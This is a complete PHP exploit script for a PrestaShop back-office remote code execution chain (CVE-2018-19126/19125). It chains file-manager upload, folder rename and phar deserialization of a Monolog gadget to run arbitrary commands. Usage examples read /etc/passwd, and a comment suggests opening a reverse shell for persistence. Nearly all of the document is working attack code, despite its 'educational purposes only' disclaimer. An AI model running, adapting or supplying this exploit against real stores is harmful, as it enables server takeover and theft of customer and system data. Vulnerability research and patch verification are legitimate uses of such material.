/**
 * 
 * PrestaShop 1.6.x <= 1.6.1.23 & 1.7.x <= 1.7.4.4 - Back Office Remote Code Execution
 * See https://github.com/farisv/PrestaShop-CVE-2018-19126 for explanation.
 * 
 * Chaining multiple vulnerabilities to trigger deserialization via phar.
 *
 * Date:
 *   December 1st, 2018
 *
 * Author:
 *   farisv
 *
 * Vendor Homepage:
 *
 * Vulnerable Package Link:
 *
 * CVE :
 *   - CVE-2018-19126
 *   - CVE-2018-19125
 * 
 * Prerequisite:
 *   - PrestaShop 1.6.x before 1.6.1.23 or 1.7.x before 1.7.4.4.
 *   - Back Office account (logistician, translator, salesman, etc.).
 * 
 * Usage:
 *   php exploit.php back-office-url email password func param
 * 
 * Example:
 *   php exploit.php http://127.0.0.1/admin-dev/ salesman@shop.com 54l35m4n123
 *   system &#039;cat /etc/passwd&#039;
 * 
 * Note:
 * Note that the upload directory will be renamed and you can&#039;t upload the
 * malicious phar file again if the folder name is not reverted. You might want
 * to execute reverse shell to gain persistence RCE or include the command to
 * rename the folder again in your payload (you need to know the path to the
 * upload directory).
 * 
 * FOR EDUCATIONAL PURPOSES ONLY. DO NOT USE THIS SCRIPT FOR ILLEGAL ACTIVITIES.
 * THE AUTHOR IS NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE.
 * 
 */

namespace PrestaShopRCE {

    class Exploit {
        private $url;
        private $email;
        private $passwd;
        private $cmd;
        private $func;
        private $param;

        public function __construct($url, $email, $passwd, $func, $param) {
            $this->url = $url;
            $this->email = $email;
            $this->passwd = $passwd;
            $this->func = $func;
            $this->param = $param;
        }

        private function post($path, $data, $cookie) {
            $curl_handle = curl_init();
            
            $options = array(
                CURLOPT_URL => $this->url . $path,
                CURLOPT_HEADER => true,
                CURLOPT_POST => 1,
                CURLOPT_POSTFIELDS => $data,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_COOKIE => $cookie
            );
            
            curl_setopt_array($curl_handle, $options);
            $raw = curl_exec($curl_handle);
            curl_close($curl_handle);

            return $raw;
        }

        private function fetch_cookie($raw) {
            $header = "Set-Cookie: ";
            $cookie_header_start = strpos($raw, $header);
            $sliced_part = substr($raw, $cookie_header_start + strlen($header));
            $cookie = substr($sliced_part, 0, strpos($sliced_part, &#039;;&#039;));
            return $cookie;
        }

        public function run() {

            // Login and get PrestaShop cookie
            $data = array(
                &#039;email&#039; => $this->email,
                &#039;passwd&#039; => $this->passwd,
                &#039;submitLogin&#039; => &#039;1&#039;,
                &#039;controller&#039; => &#039;AdminLogin&#039;,
                &#039;ajax&#039; => &#039;1&#039;
            );
            $cookie = "";
            $raw = $this->post(&#039;/&#039;, $data, $cookie);

            // Get FileManager cookie
            $data = array();
            $raw = $this->post(&#039;/filemanager/dialog.php&#039;, $data, $cookie);
            $filemanager_cookie = $this->fetch_cookie($raw);

            // Craft deserialization gadget
            $gadget = new \Monolog\Handler\SyslogUdpHandler(
                new \Monolog\Handler\BufferHandler(
                    [&#039;current&#039;, $this->func],
                    [$this->param, &#039;level&#039; => null]
                )
            );

            // Craft malicious phar file
            $phar = new \Phar(&#039;phar.phar&#039;);
            $phar->startBuffering();
            $phar->addFromString(&#039;test&#039;, &#039;test&#039;);
            $phar->setStub(&#039;<?php __HALT_COMPILER(); ? >&#039;);
            $phar->setMetadata($gadget);
            $phar->stopBuffering();

            // Change the extension
            rename(&#039;phar.phar&#039;, &#039;phar.pdf&#039;);

            // Cookie for next requests

            // Upload phar.pdf
            $curl_file = new \CurlFile(&#039;phar.pdf&#039;, &#039;application/pdf&#039;, &#039;phar.pdf&#039;);
            $data = array(
                &#039;file&#039; => $curl_file
            );
            $raw = $this->post(&#039;/filemanager/upload.php&#039;, $data, $cookie);

            // Rename image directory to bypass realpath() check
            $data = array(
                &#039;name&#039; => &#039;renamed&#039;
            );
            $raw = $this->post(
                &#039;/filemanager/execute.php?action=rename_folder&#039;,
                $data,
                $cookie
            );

            // Trigger deserialization
            // The &#039;/img/cms/&#039; substring is important to bypass string check
            $data = array(
                &#039;path&#039; => &#039;phar://../../img/renamed/phar.pdf/img/cms/&#039;
            );
            $raw = $this->post(
                &#039;/filemanager/ajax_calls.php?action=image_size&#039;,
                $data,
                $cookie
            );

            // Display the raw result
            print $raw;

        }
    }

}

/*
 * Based on
 * https://github.com/ambionics/phpggc/blob/master/gadgetchains/Monolog/RCE/1/
*/
namespace Monolog\Handler {

    class SyslogUdpHandler {
        protected $socket;

        function __construct($param) {
            $this->socket = $param;
        }
    }

    class BufferHandler {
        protected $handler;
        protected $bufferSize = -1;
        protected $buffer;
        protected $level = null;
        protected $initialized = true;
        protected $bufferLimit = -1;
        protected $processors;

        function __construct($methods, $command) {
            $this->processors = $methods;
            $this->buffer = [$command];
            $this->handler = clone $this;
        }
    }

}

namespace {

    if (count($argv) != 6) {
        $hint = "Usage:\n  php $argv[0] back-office-url email password func param\n\n";
        $hint .= "Example:\n  php $argv[0] http://127.0.0.1/admin-dev/ ";
        $hint .= "salesman@shop.com 54l35m4n123 system &#039;uname -a&#039;";
        die($hint);
    }

    if (!extension_loaded(&#039;curl&#039;)) {
        die(&#039;Need php-curl&#039;);
    }

    $url = $argv[1];
    $email = $argv[2];
    $passwd = $argv[3];
    $func = $argv[4];
    $param = $argv[5];

    $exploit = new PrestaShopRCE\Exploit($url, $email, $passwd, $func, $param);
    $exploit->run();

}

